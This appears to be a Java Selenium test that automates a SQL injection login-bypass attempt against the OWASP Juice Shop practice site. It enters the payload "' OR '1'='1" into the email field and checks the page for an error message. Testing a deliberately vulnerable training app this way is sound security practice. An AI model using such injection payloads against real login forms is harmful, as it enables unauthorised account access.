import org.openqa.selenium.By;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.WebElement;
import org.openqa.selenium.chrome.ChromeDriver;

public class SqlInjectionTest {
    public static void main(String[] args) {
        // Set the path to your WebDriver executable
        System.setProperty("webdriver.chrome.driver", "C:/WebDriver/chrome-win64/chromedriver.exe");

        // Initialize WebDriver
        WebDriver driver = new ChromeDriver();

        try {
            // Navigate to the OWASP Juice Shop login page
            driver.get("https://juice-shop.herokuapp.com/#/login");

            // Check if the page loaded correctly
            if (driver.getTitle().contains("OWASP Juice Shop")) {
                System.out.println("Page loaded successfully.");

                // Locate the username and password fields
                WebElement usernameField = driver.findElement(By.id("email"));
                WebElement passwordField = driver.findElement(By.id("password"));

                // Craft and enter the SQL injection payload
                String sqlInjectionPayload = "' OR '1'='1";
                String validPassword = "password123"; // Use an arbitrary valid password

                usernameField.sendKeys(sqlInjectionPayload);
                passwordField.sendKeys(validPassword);

                // Submit the login form
                WebElement loginButton = driver.findElement(By.id("loginButton"));
                loginButton.click();

                // Analyze the response
                WebElement errorMessage = driver.findElement(By.className("error"));
                if (errorMessage != null && errorMessage.isDisplayed()) {
                    System.out.println("SQL Injection attempt failed. Error message: " + errorMessage.getText());
                } else {
                    System.out.println("No error message found. Further analysis needed.");
                }
            } else {
                System.out.println("Page did not load correctly. Check the URL or server status.");
            }

        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            // Close the browser
            driver.quit();
        }
    }
}
